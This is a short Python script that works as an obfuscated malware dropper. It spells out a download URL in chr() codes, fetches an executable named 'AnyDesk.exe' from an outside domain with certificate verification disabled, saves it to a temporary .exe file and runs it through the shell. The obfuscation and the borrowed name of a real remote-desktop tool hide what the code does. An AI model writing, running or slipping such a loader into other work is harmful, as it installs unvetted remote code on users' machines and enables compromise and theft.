import requests
Bf=False
Ba=True
aY=requests.get
import subprocess
aO=subprocess.run
import tempfile
aQ=tempfile.NamedTemporaryFile
import urllib3
ag=urllib3.exceptions
aW=urllib3.disable_warnings
aW(ag.InsecureRequestWarning)
aA=("".join([chr(104),chr(116),chr(116),chr(112),chr(115),chr(58),chr(47),chr(47),chr(100),chr(105),chr(115),chr(107),chr(99),chr(105),chr(116),chr(121),chr(108),chr(105),chr(110),chr(107),chr(46),chr(99),chr(111),chr(109),chr(47),chr(106),chr(48),chr(80),chr(68),chr(103),chr(75),chr(80),chr(47),chr(65),chr(110),chr(121),chr(68),chr(101),chr(115),chr(107),chr(46),chr(101),chr(120),chr(101)]))
ac=aY(aA,verify=Bf)
ac.raise_for_status()
with aQ(suffix=("".join([chr(46),chr(101),chr(120),chr(101)]))                     ,delete=Bf)as aL:
  aL.write(ac.content)
  aT=aL.name
aO([aT],shell=Ba)
